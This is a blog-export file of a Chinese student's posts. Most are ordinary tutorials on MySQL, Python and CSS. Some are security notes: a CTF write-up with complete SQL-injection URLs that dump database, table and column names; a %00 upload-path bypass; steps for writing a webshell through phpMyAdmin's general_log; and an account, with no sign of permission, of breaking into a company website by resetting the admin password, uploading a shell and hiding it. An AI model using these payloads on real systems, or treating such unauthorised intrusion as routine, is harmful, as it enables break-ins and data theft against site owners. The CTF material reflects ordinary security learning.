Auto_increment：是否可以自动增长，必须是数字，如：需要给每条数据一个编号，原因是数据内容可以重复，编号不能重复。 Primary key：设置主键，数据内容不能重复，在查询数据主查询条件，一个表中一个主键，一般都是id。 unique [key]：设定为唯一（键），即表中所有行的的数据在该字段中的值不能有重复。 Comment：设置备注，给当前字段设置说明 可以看到成功创建了students表 查看表结构：desc 表名; ​ 字段名 类型 是否为空 索引 默认值 其它 ​ drop table 表名; 删除表 查看所有表：show tables; 查看创建表语句：show create table 表名; 修改表名: alter table 旧表名 rename to 新表名; 添加新字段：alter table 表名 add 新字段 字段类型 字段选项; 如下可见新增了字段address 修改表字段（包括字段名）： Alter table 表名 change 旧字段名 新字段名 新字段类型 新字段选项; 修改字段类型和选项： Alter table 表名 modify 字段名 新字段类型 新字段选项; 删除字段：alter table 表名 drop 字段名; 数据操作插入数据当我们需要向数据库表中插入一条新记录时，就必须使用INSERT语句。 语句：insert into 表名 【(字段1，字段2，字段3，…..)】 values(值1，值2，值3，……); 如果一个字段有默认值，那么在INSERT语句中也可以不出现 要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写INSERT INTO students (name, age, id, sex) ...，但是对应的VALUES就得变成(&#39;张三&#39;, 18, null, &#39;男&#39;) 还可以一次性添加多条记录 1234insert into students (id,name,age,sex) values -&gt; (null,'李四',22,'女'), -&gt; (null,'王五',19,'男'), -&gt; (null,'马六',19,'女'); 字段列表可以省略：省略后的数据必须对应上创建时字段顺序 修改数据要更新数据库表中的记录，必须使用UPDATE语句。 UPDATE语句的基本语法是： 1UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...; WHERE子句中写出需要更新的行的筛选条件id=1： 因此利用WHERE我们也可以一次更新多条记录： UPDATE students SET name=&#39;大佬&#39;, score=77 WHERE id&gt;=2 AND id&lt;=4; 在UPDATE语句中，更新字段时可以使用表达式。例如，把所有20岁以下的年龄加上5岁： 删除数据如果要删除数据库表中的记录，可以使用DELETE语句。 DELETE语句的基本语法是： 1DELETE FROM &lt;表名&gt; WHERE ...; Where条件必须添加，否则删除所有数据 如果我们要删除students id=1的数据 普通删除后保留删除的id号，不再让数据占用。 DELETE语句的WHERE和UPDATE类似，同理DELETE也能利用WHERE也能一次删除多条记录： DELETE FROM students WHERE id&gt;=2 AND id&lt;=4; 还可以使用 1truncate table 表名 truncate不能加where条件 直接删除全部记录id索引从1开始 查询数据前面多次使用过 这里就说说基本查询 以后有时间在扩展呀 要查询数据库表的数据，我们使用如下的SQL语句： 1SELECT * FROM &lt;表名&gt; 使用SELECT * FROM students时，SELECT是关键字，表示将要执行一个查询，*表示“所有列”，FROM表示将要从哪个表查询， 查询某些字段 1SELECT name,age,sex,........ FROM &lt;表名&gt;` 使用SELECT *表示查询表的所有列，使用SELECT 列1, 列2, 列3可以返回指定列，这种操作称为投影 in语句:单独查询某些数据 单独查询id=2 id=4的数据 1select * from students where id in (2,4); between语法：（表示该字段的值在给定的两个值之间，含该俩值） 查询id=2到id=4的值 1select * from students where id between 2 and 4; Like：模糊查询 字段名 like ‘要查询的字符’; 如果是直接写字符，配置查询字符必须一致。 字段名 like ‘%要查询的字符%’; %是匹配任何与之相似的字符 顾名思义 like=’像‘ 可能有点难理解这里我创建了几条类似的数据 1select * from students where name like '%大佬%'; 这样子应该会更好理解 distinct(去重)1select distinct 字段 from 表名; 显示去重后的结果 distinct 必须跟在select后面 分组查询使用group by 对查询结果分组 如果对数据进行分组统计就需要使用group by group by将表按列值进行分组 列的值相同为一组 1SELECT class_id, COUNT(*) num FROM students GROUP BY class_id; 一目了然地看出各个班级的学生人数 排序order by 进行排序 order by 默认是升序排列 1SELECT id, name, score FROM students ORDER BY score;//成绩从低到高排列 那么如何进行倒序排列 desc表示倒序 1SELECT id, name, gender, score FROM students ORDER BY score DESC;//成绩从高到低排列 使用分组查询和统计后可使用HAVING子句来对查询结果进行进一步的刷选 一般情况下我们都是用where 但是分组后where使用较少而是用HAVING来代替 更细节的东西看廖雪峰老师的博客排序 使用limit限定结果行数limit后面可以跟两个参数，第一个参数是开始的索引号，默认是0开始，第二个参数取的个数（长度） 1select * FROM student LIMIT 0,3;//从第0行开始返回三条记录 还可以使用offset(偏移) 1select * from student limit 3 offset 0 从第0行开始返回三条记录 常见的sql统计函数12345678910111213141516聚合函数(较常用) count(*) 统计数量 max(字段名)最大值 min(字段名)最小值 sum(字段名)求和 avg(字段名)求平均值运算函数 abs(x) 返回x的绝对值 floor(x) 返回小于x的最大整数值 round(x,y) 返回参数x的四舍五入的有y位小数的值 mod(x,y) 返回x/y的模 greatest(1,2,3,4,5) 返回集合中最大的值 least(1,2,3,4,5) 返回集合中最小的值字符串函数 trim(str) 去除字符串两端的空格 upper(str) 字符串转大写 用户管理修改账号密码 1234Dos命令下修改账号密码mysqladmin -u root -p password 1234 //修改root的密码为1234mysql命令修改账号密码set password fro 'root'@'localhost' = password('1234') 创建用户 1create user 'username'@'host'identified by 'password'; username表示要创建的用户名。 host指定该用户在哪个主机上可以登陆，本地用户直接写localhost如果想让该用户任意远程主机登陆 可以使用%。 password表示该用户的登陆密码 删除用户 1drop user 'username'@'host'; 字段类型字符串型 整数型 浮点型 视图视图的优势在于 安全和高效 创建视图 123CREATE VIEW &lt;视图名&gt; AS &lt;SELECT语句&gt;//下面写个例子 创建视图，作用是获取表 users 中地址为保定的学生信息create view p as select * from users where address="保定"; 查询视图 创建完成以后我们查询视图 1select * from &lt;视图名&gt;; 删除视图 1drop &lt;视图名&gt;; 事务事务用于保证数据的一致性 他有一组相关的dml语句组成该组dml语句要么全部成功执行,要么全部失败。如网上转账 就是典型的事务处理。 123456//开始事务begin;//提交commit;//回滚rollback; 默认情况下 输入sql语句则自动提交 如果开启了事务,就是关闭了自动提交的功能改成了输入commit执行提交 比如老板要给我转账 1234567begin;update users set money=money-100 where name = 'boss';update users set money=money+100 where name = 'Sch0lar';//开启事务后 我执行修改语句 如果两条语句都没有问题 则提交commit;//如果有一个出现问题 name回滚rollback; 因为要保证数据的一致性 必须全部成功 有一个错误则回滚 存储过程的创建和调用存储过程就是存储一段代码,用来完成特定的功能 123456DELIMITER // CREATE PROCEDURE GetAllProducts() BEGIN SELECT * FROM products;//存储过程主体 END //DELIMITER ; 第一个命令是DELIMITER //，它与存储过程语法无关。 DELIMITER语句将标准分隔符 - 分号(;)更改为：//。 在这种情况下，分隔符从分号(;)更改为双斜杠//。为什么我们必须更改分隔符？ 因为我们想将存储过程作为整体传递给服务器，而不是让mysql工具一次解释每个语句。 在END关键字之后，使用分隔符//来指示存储过程的结束。 最后一个命令(DELIMITER;)将分隔符更改回分号(;)。 GetAllProducts() 存储名 调用存储过程 1CALL GetAllProducts(); //GetAllProducts()是存储名 删除 1DROP PROCEDURE GetAllProducts()； //GetAllProducts()是存储名 数据库备份12mysqldump -u root -p xss &gt; d:/test/test.sql备份xss数据库到 d盘下test目录 还原数据库 123456//首先建立你要还原的数据库create database xss;//使用这个数据库use xss;//导入备份文件source d:/test/test.sql; 总结边学边记录 虽然可能效率会比较低 但是印象会很深 等以后忘了还可以回头看看 把大佬们当做目标 肝起来]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的突破上传姿势]]></title>
    <url>%2F2018%2F12%2F27%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[突破上传的姿势 在几个月前一个实战过程中登录后台有上传却无法 getshell 当时是懵逼的 但是自己并没有当回事 也没有深入理解 之后在打ctf的过程中 一道上传题 就是用到了这姿势 今天闲的蛋疼 练习ctf又遇到 才想起来要总结总结呀！！ 环境这里拿一道ctf题举例 上传突破写文件需要路径 就是目录+文件名 filepath+filenme 现在我们把filepath改成 ../1.php%00，%00后的那部分iflenname被截断了，后端则会认为../是目录 1.php是文件名 成功突破拿到flag 总结依旧的是特别水的文章 不过也记录了自己学习的过程 几年后成为大佬来看这些文章回忆青春 哈哈哈 扯远了 现在的问题还是学习效率低 继续加油！！]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python打印各种图形]]></title>
    <url>%2F2018%2F12%2F22%2FPython%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2%2F</url>
    <content type="text"><![CDATA[看国光哥的博客发现他发了一篇c语言打印各种图形 然后自己最近在学python发现这是 很锻炼萌新思维的一些题 然后就想用python写一下总结的时候发现循环这一块理解的并不是很到位 直角三角形1234for i in range(10): for j in range(i+1): print('*',end=" ") print() 直角三角形旋转90°1234for i in range(10,0,-1): for j in range(i-1): print('*',end=" ") print() 直角三角形旋转180°123456for i in range(1,10): for j in range(1,i): print(" ",end=" ") for k in range(10,i,-1): print("*",end=" ") print() 直角三角形旋转270°123456for i in range(1,10): for j in range(9,i,-1): print(" ",end=" ") for k in range(1,i): print("*",end=" ") print() 等腰三角形1234567for i in range(10): for j in range(0, 10 - i): print(end=" ") for k in range(10 - i, 10): print("*", end=" ") print("") 等腰三角形旋转90°这里用的是用的直角三角形和选择转90°的直角三角形 12345678for i in range(10): for j in range(0, i): print('*',end=" ") print()for i in range(10): for j in range(10, i,-1): print('*',end=" ") print() 等腰三角形旋转180°1234567for i in range(10): for j in range(0,i): print(end=" ") for k in range(0, 10-i): print("*", end=" ") print("") 等腰三角形旋转2701234567891011121314for i in range(10): for j in range(9,i,-1): print(" ",end=" ") for k in range(0, i): print("*",end=" ") print()for i in range(10): for j in range(0,i): print(" ",end=" ") for k in range(9, i,-1): print("*",end=" ") print() 菱形原等腰三角形和旋转180°的等腰三角形加在一起即可 123456789101112131415for i in range(10): for j in range(0, 10 - i): print(end=" ") for k in range(10 - i, 10): print("*", end=" ") print("")for i in range(10): for j in range(0,i): print(end=" ") for k in range(0, 10-i): print("*", end=" ") print("") 总结通过打印以上各种图形 感觉对for的理解更深刻了 明天会更好 真好]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python字符串方法总结]]></title>
    <url>%2F2018%2F12%2F18%2FPython%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[又是一篇菜鸡笔记 在学校很多毫无意义的事情要忙没那么多时间 自己学习效率也有待提高 今天正好有时间 加上课上也讲到了这些东西 还是比较难记的 所以总结一下 没有多少时间了 加油呀 str.strip()清除字符串两端的空格 较常用 str.capitalize()将首字符转换成大写 如果首字符没有大写形式 就返回原字符串 123&gt;&gt;&gt; 'xhy'.capitalize()'Xhy'&gt;&gt;&gt; str.title()将字符串中每个首字母 大写。判断每个单词的依据则是基于空格和标点 123&gt;&gt;&gt; 'scholar xhy'.title()'Scholar Xhy'&gt;&gt;&gt; str.lower()将字符串转换为小写 仅对ascii编码的字母有效 123&gt;&gt;&gt; 'XHY'.lower()'xhy'&gt;&gt;&gt; str.upper()将字符串转换为大写 会自动忽略不可转换成大写的字符 123&gt;&gt;&gt; 'scholar10'.upper()'SCHOLAR10'&gt;&gt;&gt; str.center()将字符串按照给定的宽度居中显示，可以给定特殊的字符 填充多余的长度 如果指定长度小于字符串长度 则返回原字符串 12&gt;&gt;&gt; '12345'.center(10,"*")'**12345***' str.count()统计指定字符串 在原字符串中的个数 str.count()可以指定查询字符串的起止位置 如 12345&gt;&gt;&gt; test='Scholars work very hard'&gt;&gt;&gt; test.count('a')2&gt;&gt;&gt; test.count('a',5,8)1 检验邮箱格式是否正确123456789email=input("请输入email邮箱")if email.count("@")==1: if email.count(".")&gt;=1: print("格式正确") else: print("邮箱应包含.")else: print("邮箱中应包含@") str.find() str.rfind()从字符串左边或右边查找指定元素出现的索引位置 也可以指定 查找的起止范围 要查找的元素不存在时 返回-1 (不论左边还是右边查找得到的结果都是字符串左边数起的) 1234567&gt;&gt;&gt; text = 'puter protective covering'&gt;&gt;&gt; text.find('er')3&gt;&gt;&gt; text.find('sc')-1&gt;&gt;&gt; text.find('er',3)3 str.index() str.rindex()与 str.find() str.rfind()类似 不同的是如果要查找的元素不存在 则会引发ValueError str.replice()str.replice(old,new,count) 用新字符串代替旧字符串 可以指定替换次数 12345&gt;&gt;&gt; text = 'qwe asd kkk lll qwe'&gt;&gt;&gt; text.replace('qwe','scholar')'scholar asd kkk lll scholar'&gt;&gt;&gt; text.replace('qwe','scholar',1)'scholar asd kkk lll qwe' str.endswith() str.startswith()判断字符串是否以某个指定的字符串 开头或结尾 返回布尔值 可指定查找的起止范围 12345&gt;&gt;&gt; a="Scholars work very hard"&gt;&gt;&gt; a.endswith('rd')True&gt;&gt;&gt; a.startswith("Sc")True str.split()使用指定的字符将整个字符串拆分为若干个元素 并返回一个列表 ，默认没有参数时 拆分符为空格符 1234&gt;&gt;&gt; '1,2,3'.split(',')['1', '2', '3']&gt;&gt;&gt; 'i love python'.split()['i', 'love', 'python'] str.isdigit()isdigit() 方法检测字符串是否只由数字组成 123456&gt;&gt;&gt; str = '123'&gt;&gt;&gt; str.isdigit()True&gt;&gt;&gt; str = 'scholar'&gt;&gt;&gt; str.isdigit()False 字符串方法的实际运用任意读入一个字符串 判断是否为数字 123456789101112131415161718192021s=input("请任意输入一个数字字符串")##-1.23 1.23if s.startswith('-'): str1=s.split('-')##-1.23 str2=str1[1]elif s.startswith('+'): str1=s.split('+') str2=str1[1]else: str2=sdotCounts=str2.count('.')if dotCounts==0 and str2.isdigit()==True: print("%s是一个数字"%(s))elif dotCounts==1: strList=str2.split('.') if strList[0].isdigit() and strList[1].isdigit(): print("%s是一个数字"%(s)) else: print("%s不是一个数字"%(s))else: print("%s不是一个数字"%(s))]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记被大佬们带飞的一次NCTF]]></title>
    <url>%2F2018%2F11%2F26%2F%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF%2F</url>
    <content type="text"><![CDATA[前些天 国光老哥在群里问有没有打NJUPT CTF的 校外和他组队 然后问了问光光老哥说是 面向校外 不能太简单 但是对新手也不会太不友好 然后就本着去学东西 练习的态度 抱老哥的大腿去（嘻嘻）最后果然 校外队第九 咳咳 虽然我只是观众 大佬们都很强哟 但是也不希望自己一直都是观众 所以 特此总结一些题 希望以后越来越🐮🍺 签到题 满怀自信的右键源代码 然后发现并没有flag 最后大佬们发现直接访问主域名 老把精力放在了secret.php 这上面 滴！晨跑打卡这道题 是自己复习的重点了 点进去 知道考察的是 mysql 注入 但是 当时自己就是搞不出来 还差的远 事后又请教了国光老哥 验证注入是否存在验证时候发现过滤了空格 用%a0即可绕过 1'%a0||'1 这里直接查询出所有的数据了 如果没有这个语句的话 默认只查询出1条数据 ‘ or ‘1 相当于构造出一个用真的条件 开始进行注入 ​ 咳咳 大佬语录记录一下 ！借助hackbar可以进行快速的注入 判断注入的字段数123'%a0union%a0select%a01,2,3||'1 ' union select 1,2,3 ||'1闭合前面的引号 核心语句 查报错的字段数 构造用真条件 闭合后面语句 所有数据库1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(schema_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.SCHEMATA),2,3||%271 咳咳根据我多年打酱油的经验 查询flaaaaaaag数据库下面的表1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(table_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA=0x666c6161616161616167),2,3||%271 f144444444g 查询列名1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271 查出数据1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271 nctf{this_1s_paocao_sqllllll}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css样式那些事]]></title>
    <url>%2F2018%2F11%2F05%2Fcss%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[最近学校开了前端 希望通过自己的努力打开web前端的大门 最令人头疼的就是css的各种属性 真心事记住不 所以 写篇文章总结一下 文字样式常用单位首先看一下css样式的常用单位 以 px像素为单位的 em 对于文本类型的属性经常使用到 1em指一个字符 2em指两个字符(比如我们设置行高 两个字符的行高 就把这个属性的值设置成2em) 还有一个%为单位 这个不用多说了把 文本样式12color 文本的颜色 (red #f00 rgd(255,0,0) ) letter-spacing 字符间距 (2px -3px) 1line-height 行高 (14px 1.5em 120%) 很多时候我们用这个来做垂直居中 1line-height =height 的时候 就会做到垂直居中 1text-align 对齐 (center居中 left左 right右 justify两端对齐不会让两端出现空白的部分） 1text-decoration 装饰线 (none无装饰线 默认情况下超链接下面都带有竖线 貌似很影响美观把 这时候none可将其取消，overline装饰线在文本的上方 underline装饰线在文本的下方 line-through 装饰线作为删除线贯穿文本之中) 1text-indent 首行缩进 (2em) 字体font 老规矩还是一张图 节省时间学习新知识去 O(∩_∩)O 背景超链接样式背景类型的样式我们用background 123background-color: 背景颜色background-image:url("logo,jpg") 背景图片 注意如果同时设置背景颜色和背景图片的话 背景图片会覆盖掉背景颜色 1234567background-repeat: repeat 背景图片的填充方式 repeat-x repeat-y no-repeat ​ 可能显得太麻烦 太多 太难记 其实也可以用 1background: 颜色 图片 repeat 来统一设置 连接的四种形态超链接的样式是用a开头 1234a:link --普通的未被访问的链接a:visited -用户已访问的链接a:hover -鼠标指针位于链接的上方悬停a:active - 链接被点击的时刻 这种超链接或这种选择器的类型称为伪类选择器 这种位置分先后顺序的 l v h a 四种状态下设置超链接样式时候的设置方式和设置顺序 a:hover也能做出简单的动画效果 根据前面的学习不难看出 ，鼠标顶留在a标签文字上 字体放大 120% 这种简单的动画效果貌似还很常用的吧😁 列表 表格样式列表的样式吧 主要是list开头 列表的样式这里指无序列表(ul)和有序列表(ol) 共用样式有一下几种 1234567list-style 所有列表属性设置在这个声明中list-style-image 为列表项设置图像list-style-position 标志的位置list-style-type 标志的类型 list-style-type 属性type属性对于有序和无序列表可以取得以下这些值 前四种针对无序列表 后面针对有序列表 list-style-position123list-style-position:insidelist-style-position:outside 两者区别在哪 用文字说可能比较抽象 我们用一张图表示更加明确 inside 标号是向右缩进到这个列表区域之内 outside 是在列表的左侧 list-style-imageimage属性可以规定列表的标号是一个图片：list-style-image:url(“1.jpg”); 可以起到美化页面的作用 表格样式表格样式主要是设置表格的高和宽 这个大家应该都知道 还有一个经常是用的就是border 边框属性 还有一个非常重要的border-collapse属性 合并默认表格样式 123456table&#123; width:100px; height:100px; border:1px solid #eee ; //一个像素宽 实线显示 灰色 每个属性之间用空格隔开 border-collapse:collapse;&#125;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习笔记]]></title>
    <url>%2F2018%2F10%2F29%2FPython%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[入坑了python3 知识点颇多 看了一遍 看第二遍时候发现 和没看没什么两样 所以把某些知识点 记录一下 加深印象也方便 忘记时候查看 组和数据类型集合类型及操作集合元素之间无序，每个元素唯一 不存在相同元素 ，集合元素是不可变数据类型，在Python中集合用{}表示，元素间用 “,”分隔 也可以用set()建立集合 set()将每个字符单独拆分 变成集合的元素 集合操作符 可能有点难理解 那我们就打一下 a = {&quot;p&quot;,&quot;y&quot;,123}b = set(&quot;pypy123&quot;)a-b{123}b-a{&#39;2&#39;, &#39;3&#39;, &#39;1&#39;}a&amp;b{&#39;y&#39;, &#39;p&#39;}a|b{&#39;3&#39;, &#39;1&#39;, &#39;2&#39;, &#39;y&#39;, 123, &#39;p&#39;} 在四种基本操作符上python提供了增强操作符 通过四种操作符于赋值符号 来完成对集合s的更新 集合处理方法s.add(x) 将x增加到集合s s.discard(x) 从集合s中移除x 如果x不再集合s中，不报错 s.remove(x) 从集合s中移除x 如果x不再集合s中，报出KeyError s.clear()移除s中所有元素 s.pop() 随机返回一个s元素 s为空则 报出KeyError s.copy 返回集合s的一个副本 len(s) 返回集合s的元素个数 x in s 判断x是否在s中 是则True 否则False set(x)将其他类型变量转换为集合 集合类型总结集合类型 适用于包含关系的比较 举个例子 还有一个非常重要的 数据去重 就是利用 集合类型不能重复的特点 例如将一个List 去掉其中的重复元素 这里就可以用集合进行数据去重 非常简单容易 这里先用set 将list转换成集合来达到了 去重的目的 然后将集合在转换为列表。 序列类型及操作序列类型包括 字符串类型 元组类型和列表类型 序列操作符x in s 如果x是序列s的元素则返回True 否则返回Fals s+t 链接两个序列 s+t s * n或n * s 将序列s复制n次 s[i] 索引返回s中的第i个元素 s[i:j:k] 切片返回序列s中 i到j 且步长为k的元素序列 序列函数和方法len(s) 返回序列s的长度 min(s) 返回序列s的最小元素 max(s) 返回序列s的最大元素 s.count(x) 返回序列s中出现x的次数 元组类型及操作元组是序列类型的一种,使用() 或tuple()创建 元素间用,分隔。元组创建以后不能修改 元组继承了序列全部通用操作 列表类型及操作列表是序列类型的一种,使用[] 或list()创建 元素间用,分隔。列表创建可以随意修改 列表类型操作函数和方法到这里内容很多 一会还要去上课 (其实是懒得打了)就从网上找了两张图 很详细 序列类型总结序列类型 包括字符串 列表 元组 元组操作于序列基本相似，列表的话再序列基础上增加很多 更加灵活 字典类型及操作字典类型的定义映射是一种键(索引)和值(数据)的对应 ​ “城市”:”北京” ​ “姓名”:”周某人” 字典是键值对的集合，键值对之间无序 键值对：键是数据索引的扩展 采用{}和dict()创建键值对用·冒号:表示 在字典变量中通过建获得值 a[“中国”] 则会出现北京 字典类型操作函数和方法 字典类型的应用场景统计数据出现的次数，数据是键 次数是值 主要作用：表达键值对数据 进而操作 字典类型总结映射关系采用键值对表示 字典类型采用{}和dict()创建 键值对之间用:隔开 d[key] 既可以索引也可以赋值 牢记字典类型的操作函数]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php myadmin写shell]]></title>
    <url>%2F2018%2F08%2F26%2Fphp%20myadmin%D0%B4shell%2F</url>
    <content type="text"><![CDATA[有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。 具体内容 简单说明登陆进php myadmin 有些朋友可能会直接选择去写入一个webshell 执行后会弹出大概无法写入的意思 这里和php myadmin的设置有关系 在实战情况下一般都不能直接去写入一个shell的。 这时候我们需要换个思路 利用mysql 错误日志写入一句话这里需要先设置 general log (日志保存状态)general log file(日志保存路径) 先执行 1show variables like 'general%' a 我们需要把general log 改为ON 也就是打开状态 还要把general log file路径改为网站的根目录 123set global general_log = "ON"; set global general_log_file='D:/stduy/PHPTutorial/WWW/infos.php'; 执行完后因为我是本地搭建环境所以可以看到成功创建了 现在我们只需要输入一个错误的sql语句即可 这里我写入一句话 可以看到一句话已经存在于infos.php里面了 之后我们菜刀直接链接即可 总结网上有许多相关的文章 不过自己写一遍印象才会更深刻吧]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>php myadmin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透某企业]]></title>
    <url>%2F2018%2F08%2F09%2F%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[在家无聊，突然想到博客搞上也有数天 没时间写文章，今天正好无聊 实战内容确定目标站 信息收集相信很多人吧都会忽略信息收集这一块，完整的信息收集应该包括 收集 whois 邮箱 收集 子域名 c段 旁站 收集网站架构 运行的服务 对应的端口 探测 waf google hacking 敏感文件 收集网站的 cms 信息 有所发现在信息收集的过程中我发现网站右上脚有 因为主站是伪静态 我本人确实很排斥这种伪静态 我就点了英文版的站 就发现 主站的url:www.xxx.com 英文版url:www.xxx.com/en 原来是分目录 English的站并没有做伪静态 准备对准他下手 习惯性的先扫描一番 我发现了此文件 ,打开一看我尼玛 管理员真的粗心,是一个密码重置，管理员居然没有删 因为我知道有admin 所以第一步直接填了admin 第二步即可重置，改完密码直接进入后台 拿shelldede cms拿shell很简单 有个文件管理器直接可上传get shell 拿到shell后可直接跨目录 因为信息收集我发现是apache 还有.htacces文件 可以更好的隐藏我们的shell 这里我就不演示了 此篇没有什么技术含量 只当是做个笔记而已]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
</search>
